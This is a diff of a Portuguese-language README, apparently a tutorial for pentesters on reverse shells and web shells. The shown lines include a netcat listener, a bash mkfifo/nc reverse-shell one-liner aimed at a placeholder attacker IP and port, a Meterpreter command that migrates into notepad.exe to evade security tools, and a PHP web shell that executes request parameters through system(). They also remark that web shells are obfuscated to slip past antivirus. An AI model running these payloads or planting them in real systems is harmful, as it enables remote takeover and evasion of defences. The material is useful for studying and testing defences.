@@ -10,7 +10,7 @@
 
 Este artigo aborda o uso de **Reverse Shells** e **Web Shells** em um contexto de **testes de segurança ofensiva**. Esses conceitos são essenciais para analistas e pesquisadores de segurança que desejam compreender e testar a exposição de sistemas a ataques remotos.
 
-A imagem que ilustra este README é apenas uma brincadeira sobre como um simples processo (`notepad.exe`) pode se tornar sinistro quando inicia uma conexão reversa para a máquina de um atacante, abrindo caminho para exploração do sistema.
+A imagem que ilustra este README é apenas uma brincadeira sobre como um simples processo (`notepad.exe`) pode se tornar sinistro e no minimo suspeito quando inicia uma conexão reversa para a máquina de um atacante, abrindo caminho para exploração do sistema.
 
 ---
 
@@ -24,7 +24,7 @@ Um **Reverse Shell** é quando a máquina alvo (vítima) inicia a conexão com o
 
 ### 1. Listener (Atacante)
 
-No seu **host de ataque**, abra um **listener** (ouvinte) que aguardará a conexão de entrada. Um exemplo usando **Netcat** (nc) na porta 443 (usada para HTTPS, o que às vezes passa despercebido nos firewalls):
+No seu **host de ataque**, abra um **listener** (ouvinte) que aguardará a conexão de entrada. Um exemplo usando **Netcat** na porta 443, mas tu pode usar outras tools, até mesmo o telnet.
 
 `nc -lvnp 443`
 
@@ -41,9 +41,9 @@ No seu **host de ataque**, abra um **listener** (ouvinte) que aguardará a conex
 
 No alvo, executamos o **payload** que iniciará a conexão reversa para o IP do atacante e porta configurada. Exemplos de payload em **Bash**:
 
-`rm -f /tmp/f mkfifo /tmp/f cat /tmp/f | sh -i 2>&1 | nc IP_ATACANTE IP_ATACANTE >/tmp/f`
+`rm -f /tmp/f mkfifo /tmp/f cat /tmp/f | sh -i 2>&1 | nc IP_ATACANTE PORTA_ATACANTE >/tmp/f`
 
-> Substitua `IP_ATACANTE` e `IP_ATACANTE` pelos valores adequados, por exemplo `172.16.52.5` e `443`.
+> Substitua `IP_ATACANTE` e `PORTA_ATACANTE` pelos valores adequados, por exemplo `172.16.52.5` e `443`.
 
 ### 3. Conexão recebida (Atacante)
 
@@ -52,6 +52,10 @@ Se tudo ocorrer bem, você verá algo como:
 `connect to [172.16.26.6] from (UNKNOWN) [172.16.52.5] 59964`
 
 E terá um shell interativo na máquina alvo.
+
+Lembrando que isso é num cenário local, onde vc esteja no mesmo escopo de rede privado, ou usando VPN, ou atraves de firewall rules que se enxergam. Em casos reais é preciso tomar algumas outras ações como uso do ngrok, port forwarding mas não serão abordadas aqui.
+
+
 
 ---
 
@@ -74,11 +78,11 @@ Após obter acesso com uma sessão do Metasploit, o comando para migrar para o `
 
 `meterpreter > migrate <PID_do_notepad.exe>`
 
-> **Nota:** O `<PID_do_notepad.exe>` representa o identificador do processo do notepad.exe no sistema alvo.
+> **Nota:** O `<PID_do_notepad.exe>` representa o identificador do processo do notepad.exe no sistema Windows.
 
 Essa técnica transforma o que inicialmente poderia ser uma conexão de shell “aberta” em uma operação mais furtiva, onde o payload passa a ser executado dentro de um processo bem conhecido e muitas vezes desconsiderado pelos mecanismos automáticos de segurança.
 
-Nem sempre o notepad será a melhor opção, mas usamos ele de exemplo só pra mostrar que é possivel, é bom deixar claro também que existem outros processos mais importantes e mais uteis para se camuflar.
+Nem sempre o notepad será a melhor opção, mas usamos ele de exemplo só pra mostrar que é possivel, é bom deixar claro também que existem outros processos mais importantes e mais uteis para se camuflar e que também depende do seu sistema operacional.
 
 ---
 
@@ -106,6 +110,7 @@ Um exemplo clássico seria algo como:
 `<?php if(isset($_REQUEST['cmd'])){     system($_REQUEST['cmd']); } ?>`
 
 > Por questões de _defesa_, muitos antivírus/EDRs identificam strings específicas. Por isso, é comum ver web shells ofuscados ou empacotados em imagens, como foi feito no exemplo acima, para “enganar” detecções.
+> Em alguns casos ainda mais especificos, extensões de navegadores e alguns antivirus nem deixariam você abrir essa página do github por achar que é algo malicioso.
 
 Para acessar o shell, basta navegar até:
 
